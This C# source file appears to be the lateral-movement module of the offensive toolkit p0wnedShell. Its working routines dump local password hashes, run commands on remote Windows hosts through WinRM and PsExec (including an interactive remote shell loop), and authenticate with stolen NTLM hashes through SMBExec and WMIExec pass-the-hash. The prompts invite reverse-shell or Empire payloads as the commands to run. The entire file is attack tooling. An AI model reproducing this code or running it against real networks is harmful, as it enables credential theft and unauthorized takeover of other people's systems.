using System;
using System.IO;
using System.Net;

namespace p0wnedShell
{

    class LatMovement
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Use WinRM, PsExec, SMB/WMI to execute commands on remote systems. *" };
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Use Invoke-Command (WinRM) to execute commands on a remote system.");
            Console.WriteLine();
            Console.WriteLine(" 2. Use Invoke-PsExec to execute commands on a remote system.");
            Console.WriteLine();
            Console.WriteLine(" 3. Use Get-PassHashes to dump local password Hashes (Usefull for PtH Authentication).");
            Console.WriteLine();
            Console.WriteLine(" 4. Use Invoke-SMBExec to perform SMBExec style command execution with NTLMv2 PtH Authentication.");
            Console.WriteLine();
            Console.WriteLine(" 5. Use Invoke-WMIExec to perform WMI command execution on targets using NTLMv2 PtH Authentication.");
            Console.WriteLine();
            Console.WriteLine(" 6. Back.");
            Console.Write("\nEnter choice: ");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 6)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    PSRemoting();
                    break;
                case 2:
                    PsExec();
                    break;
                case 3:
                    if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        GetPassHash();
                    }
                    break;
                case 4:
                    PtHExec("SMB");
                    break;
                case 5:
                    PtHExec("WMI");
                    break;
                default:
                    break;
            }
        }

        public static void PSRemoting()
        {
            string[] toPrint = { "* Use Invoke-Command to execute Scriptblocks on a remote system.    *" };
            Program.PrintBanner(toPrint);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] For PowerShell remoting we need to have privileges to login remotely.");
            Console.WriteLine("[+] PSRemoting also needs to be enabled on the remote host.");
            Console.WriteLine("[+] On Domain Joined Computers this can be enabled as follow: \"Enable-PSRemoting -Force\".\n");
            Console.ResetColor();
            Console.WriteLine("[+] Do you want to use Get-Credential to enter valid credentials?");
            Console.Write("[+] Press \"n\" if you're already running p0wnedshell with valid creds (Domain Admin e.g.) (y/n) > ");
            Console.ForegroundColor = ConsoleColor.Green;

            bool Creds = true;
            string User = null;
            string Hostname = null;

            string input = Console.ReadLine();
            Console.ResetColor();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the user account we want to use for our session (e.g. b.atman@gotham.local) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    User = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (User == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid user account, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Creds = false;
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }
          
            Console.Write("\n[+] Now enter the hostname on which to execute your commands (e.g. dc1.gotham.local) > ");
            Console.ForegroundColor = ConsoleColor.Green;
            Hostname = Console.ReadLine().TrimEnd('\r', '\n');
            Console.ResetColor();
            if (Hostname == "")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }
            InvokeCommand(Creds, User, Hostname);

        }

        public static void InvokeCommand(bool Creds, string User, string Hostname)
        {
            Console.WriteLine("\n[+] Now enter a Command or Scriptblock we want to execute on our Target.");
            Console.WriteLine("[+] For example a Encoded PowerShell Reversed Shell or Empire Payload.\n");

            //Change ReadLine Buffersize
            Console.SetIn(new StreamReader(Console.OpenStandardInput(8192), Console.InputEncoding, false, 8192));
            Console.ForegroundColor = ConsoleColor.Green;
            string Command = Console.ReadLine();
            Console.ResetColor();

            if (Creds)
            {
                string Invoke_Command_Creds = "Invoke-Command -ComputerName " + Hostname + " -Credential " + User + " -ScriptBlock {" + Command + "}";
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine();
                Console.WriteLine("[+] Please wait while executing our Remote Commands...\n");
                Console.ResetColor();
                try
                {
                    P0wnedListener.Execute(Invoke_Command_Creds);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }

            }
            else
            {
                string Invoke_Command = "Invoke-Command -ComputerName " + Hostname + " -ScriptBlock {" + Command + "}";
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine();
                Console.WriteLine("[+] Please wait while executing our Remote Commands...\n");
                Console.ResetColor();
                try
                {
                    P0wnedListener.Execute(Invoke_Command);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void PsExec()
        {
            string[] toPrint = { "* Use PsExec to execute commands on remote system.                  *" };
            Program.PrintBanner(toPrint);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] For this attack to succeed, you need to have remote Admin privileges.\n");
            Console.ResetColor();
            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
            string Hostname = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the hostname of the machine you want to run your commands on (e.g. dc1.gotham.local) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Hostname = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (Hostname == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }
            PsExecShell(Hostname);

        }

        public static void PsExecShell(string Hostname)
        {
            string TestConnection = "Invoke-PsExec -ComputerName " + Hostname + " -Command \"whoami\" -ResultFile \"" + Program.P0wnedPath() + "\\Result.txt\"";
            Pshell.RunPSCommand(TestConnection);
            if (!File.Exists(Program.P0wnedPath() + "\\Result.txt"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Cannot connect to server, probably insufficient permission or a firewall blocking our connection.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }
            File.Delete(Program.P0wnedPath() + "\\Result.txt");
            Console.WriteLine();

            while (true)
            {
                int bufSize = 8192;
                Stream inStream = Console.OpenStandardInput(bufSize);
                Console.SetIn(new StreamReader(inStream, Console.InputEncoding, false, bufSize));

                Console.Write("[system@" + Hostname + " ~]$ ");
                string cmd = Console.ReadLine();
                string PsExec = "Invoke-PsExec -ComputerName " + Hostname + " -Command \"" + cmd + "\" -ResultFile \"" + Program.P0wnedPath() + "\\Result.txt\"";
                string Result = null;
                if (cmd == "exit")
                {
                    return;
                }
                else if (cmd == "quit")
                {
                    return;
                }
                else
                {
                    try
                    {
                        Pshell.RunPSCommand(PsExec);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                if (File.Exists(Program.P0wnedPath() + "\\Result.txt"))
                {
                    Result = System.IO.File.ReadAllText(Program.P0wnedPath() + "\\Result.txt");
                    System.Console.WriteLine("{0}", Result);
                    File.Delete(Program.P0wnedPath() + "\\Result.txt");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[+] Oops something went wrong, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                }
            }
        }

        public static void GetPassHash()
        {
            string[] toPrint = { "* Use Get-PassHashes to dump local password Hashes.                 *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait while dumping our local password Hashes...\n");
            string GetHashes = "Get-PassHashes | Out-File ./Hashes.txt; Get-Content ./Hashes.txt";
            try
            {
                P0wnedListener.Execute(GetHashes);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\nHashes saved in .\\Hashes.txt");
            Console.ResetColor();

            Console.WriteLine("\n[+] Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void PtHExec(string Prot)
        {
            string[] toPrint = { "* Use Invoke-" + Prot + "Exec for Remote Command execution with NTLMv2 PtH.  *" };
            Program.PrintBanner(toPrint);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] Invoke-" + Prot + "Exec uses a users NTLM password Hash for Authentication.\n");
            Console.ResetColor();
            Console.Write("[+] Do you have the required NTLM Hash? (y/n) > ");
            string User = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the name of the user we want to use for Authentication (e.g. b.atman@gotham.local) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    User = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (User == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid user account, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to get the users NTLM Hash.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            IPAddress Target = IPAddress.Parse("1.1.1.1");

            while (true)
            {
                try
                {
                    Console.Write("[+] Enter the ip address of our Target: ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Target = IPAddress.Parse(Console.ReadLine());
                    Console.ResetColor();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
                    Console.ResetColor();
                }
            }

            Console.Write("[+] Now enter the NTLM hash of our user account > ");
            Console.ForegroundColor = ConsoleColor.Green;
            string ntlm_hash = Console.ReadLine();
            Console.ResetColor();
            if (ntlm_hash.Length != 32)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] This is not a valid ntlm hash, please try again\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.WriteLine("\n[+] Finally enter a Command we want to execute on our Target.");
            Console.WriteLine("[+] For example a Encoded PowerShell Reversed Shell or Empire Payload.\n");

            //Change ReadLine Buffersize
            Console.SetIn(new StreamReader(Console.OpenStandardInput(8192), Console.InputEncoding, false, 8192));
            Console.ForegroundColor = ConsoleColor.Green;
            string Command = Console.ReadLine();
            Console.ResetColor();

            string Invoke_Hash = "Invoke-" + Prot + "Exec -Target " + Target + " -Username \"" + User + "\" -Hash " + ntlm_hash + " -Command \"" + Command + "\" -verbose";
            Console.WriteLine();
            Console.WriteLine("[+] Please wait while executing our Remote Commands...\n");
            try
            {
                P0wnedListener.Execute(Invoke_Hash);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

    }
}